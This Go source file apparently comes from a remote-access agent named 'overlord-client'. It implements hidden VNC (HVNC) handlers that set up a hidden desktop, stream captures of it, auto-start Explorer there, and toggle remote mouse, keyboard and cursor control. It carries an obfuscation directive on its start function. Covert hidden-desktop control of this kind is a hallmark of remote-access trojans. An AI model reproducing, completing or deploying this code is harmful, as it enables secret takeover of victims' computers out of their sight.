package handlers

import (
	"context"
	"log"
	"overlord-client/cmd/agent/capture"
	rt "overlord-client/cmd/agent/runtime"
	"sync"
	"sync/atomic"
	"time"
)

var (
	hvncPersistedDisplayValue int
	hvncPersistedDisplayMu    sync.Mutex
	hvncTargetFPS             atomic.Int64
)

func persistHVNCDisplaySelection(display int) {
	hvncPersistedDisplayMu.Lock()
	hvncPersistedDisplayValue = display
	hvncPersistedDisplayMu.Unlock()
}

func GetPersistedHVNCDisplay() int {
	hvncPersistedDisplayMu.Lock()
	defer hvncPersistedDisplayMu.Unlock()
	return hvncPersistedDisplayValue
}

func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	fps := activeHVNCTargetFPS()
	interval := time.Second / time.Duration(fps)
	capture.SetH264TargetFPS(fps)
	capture.SetFrameFlowTargetFPS(fps)
	log.Printf("hvnc: starting stream (target fps %d)", fps)

	if err := capture.InitializeHVNCDesktop(); err != nil {
		log.Printf("hvnc: failed to initialize hidden desktop: %v", err)
		return err
	}

	if autoStartExplorer {
		goSafe("hvnc auto-start explorer", nil, func() {
			if err := capture.HVNCAutoStartExplorer(); err != nil {
				log.Printf("hvnc: auto-start explorer error: %v", err)
			}
		})
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	currentFPS := fps
	for {
		select {
		case <-ctx.Done():
			log.Printf("hvnc: stopping stream")
			capture.CleanupHVNCDesktop()
			return nil
		case <-ticker.C:
			fps := activeHVNCTargetFPS()
			if fps != currentFPS {
				currentFPS = fps
				capture.SetH264TargetFPS(fps)
				capture.SetFrameFlowTargetFPS(fps)
				ticker.Reset(time.Second / time.Duration(fps))
				log.Printf("hvnc: target fps changed to %d", fps)
			}
			if err := capture.NowHVNC(ctx, env); err != nil {
				if ctx.Err() != nil {
					log.Printf("hvnc: stopping stream")
					capture.CleanupHVNCDesktop()
					return nil
				}
				log.Printf("hvnc: capture error: %v", err)
			}
		}
	}
}

func activeHVNCTargetFPS() int {
	if fps := int(hvncTargetFPS.Load()); fps > 0 {
		return fps
	}
	_, fps := streamInterval("OVERLORD_HVNC_MAX_FPS", 120)
	return SetHVNCTargetFPS(fps)
}

func SetHVNCTargetFPS(fps int) int {
	fps = clampDesktopTargetFPS(fps)
	hvncTargetFPS.Store(int64(fps))
	capture.SetH264TargetFPS(fps)
	capture.SetFrameFlowTargetFPS(fps)
	return fps
}

func HVNCSelect(ctx context.Context, env *rt.Env, display int) error {
	prev := env.HVNCSelectedDisplay
	maxDisplays := capture.HVNCMonitorCount()
	if display < 0 || display >= maxDisplays {
		log.Printf("hvnc: WARNING - requested display %d out of range (0-%d), clamping to 0", display, maxDisplays-1)
		display = 0
	}
	env.HVNCSelectedDisplay = display

	persistHVNCDisplaySelection(display)
	log.Printf("hvnc: set selected display from %d to %d (reported monitors=%d, will capture monitor at index %d)", prev, display, maxDisplays, display)
	return nil
}

func HVNCMouseControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.HVNCMouseControl = enabled
	log.Printf("hvnc: mouse control %v", enabled)
	return nil
}

func HVNCKeyboardControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.HVNCKeyboardControl = enabled
	log.Printf("hvnc: keyboard control %v", enabled)
	return nil
}

func HVNCCursorControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.HVNCCursorCapture = enabled
	capture.SetHVNCCursorCapture(enabled)
	log.Printf("hvnc: cursor capture %v", enabled)
	return nil
}
